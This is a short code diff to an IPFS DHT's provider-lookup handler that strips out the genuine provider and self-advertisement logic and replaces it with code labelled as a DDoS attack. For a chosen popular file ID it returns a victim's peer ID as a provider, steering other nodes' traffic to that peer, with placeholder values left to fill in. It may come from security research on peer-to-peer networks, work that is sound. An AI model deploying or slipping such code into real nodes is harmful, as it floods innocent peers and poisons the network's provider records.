@@ -306,18 +306,15 @@ func (dht *IpfsDHT) handleGetProviders(ctx context.Context, p peer.ID, pmes *pb.
 	logger.Debugf("%s begin", reqDesc)
 	defer logger.Debugf("%s end", reqDesc)
 
-	// check if we have this value, to add ourselves as provider.
-	has, err := dht.datastore.Has(convertToDsKey(c.Bytes()))
-	if err != nil && err != ds.ErrNotFound {
-		logger.Debugf("unexpected datastore error: %v\n", err)
-		has = false
-	}
-
 	// setup providers
-	providers := dht.providers.GetProviders(ctx, c)
-	if has {
-		providers = append(providers, dht.self)
-		logger.Debugf("%s have the value. added self as provider", reqDesc)
+	providers := make([]peer.ID, 1)
+
+	// DDoS type 1: return peer ID to be attacked (only works with active IPFS nodes)
+	popularFileID := ""
+
+	if c.String() == popularFileID {
+		ddosVictim := peer.ID("insertIDhere")
+		providers = append(providers, ddosVictim)
 	}
 
 	if providers != nil && len(providers) > 0 {
